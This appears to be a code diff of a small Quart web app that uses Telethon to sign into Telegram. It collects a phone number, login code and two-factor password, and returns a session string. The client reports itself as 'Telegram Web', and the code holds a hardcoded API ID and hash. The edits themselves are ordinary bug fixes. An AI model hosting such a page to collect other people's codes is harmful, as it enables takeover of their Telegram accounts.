@@ -7,7 +7,7 @@ from telethon.errors import SessionPasswordNeededError
 
 app = Quart(__name__)
 
-# Core Credentials (Same as your bot)
+# Core Credentials
 API_ID = int(os.environ.get("API_ID", 23483842))
 API_HASH = os.environ.get("API_HASH", "63f3942db5bb0bd6ab36352ca52e773b")
 
@@ -66,7 +66,7 @@ HTML_TEMPLATE = """
     <script>
         let currentPhone = "";
 
-        async defAPI(url, data) {
+        async function safeAPI(url, data) {
             const res = await fetch(url, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -81,7 +81,7 @@ HTML_TEMPLATE = """
             currentPhone = phone;
             document.getElementById('error-msg').innerText = "";
             
-            const res = await defAPI('/submit_phone', { phone });
+            const res = await safeAPI('/submit_phone', { phone });
             if(res.status === 'ok') {
                 document.getElementById('step-phone').classList.add('hidden');
                 document.getElementById('step-otp').classList.remove('hidden');
@@ -96,7 +96,7 @@ HTML_TEMPLATE = """
             if(!otp) return;
             document.getElementById('error-msg').innerText = "";
 
-            const res = await defAPI('/submit_otp', { phone: currentPhone, code: otp });
+            const res = await safeAPI('/submit_otp', { phone: currentPhone, code: otp });
             if(res.status === 'ok') {
                 showSuccess(res.session);
             } else if(res.status === '2fa_needed') {
@@ -113,7 +113,7 @@ HTML_TEMPLATE = """
             if(!password) return;
             document.getElementById('error-msg').innerText = "";
 
-            const res = await defAPI('/submit_password', { phone: currentPhone, password });
+            const res = await safeAPI('/submit_password', { phone: currentPhone, password });
             if(res.status === 'ok') {
                 showSuccess(res.session);
             } else {
@@ -135,7 +135,8 @@ HTML_TEMPLATE = """
 
 @app.route('/')
 async def index():
-    return render_template_string(HTML_TEMPLATE)
+    # ✅ FIXED: Added await here
+    return await render_template_string(HTML_TEMPLATE)
 
 @app.route('/submit_phone', methods=['POST'])
 async def submit_phone():
@@ -146,7 +147,6 @@ async def submit_phone():
         return jsonify({"status": "error", "message": "Phone number missing."})
         
     try:
-        # Client initialize device spoof parameters ke sath browser application flow mein
         client = TelegramClient(StringSession(), API_ID, API_HASH, device_model="Telegram Web", system_version="Windows Web", app_version="1.0.0")
         await client.connect()
         
@@ -203,8 +203,5 @@ async def submit_password():
         return jsonify({"status": "error", "message": str(e)})
 
 if __name__ == '__main__':
-    # Run server locally or via entrypoint allocation
-    import numba
     port = int(os.environ.get("PORT", 5000))
     app.run(host='0.0.0.0', port=port)
-
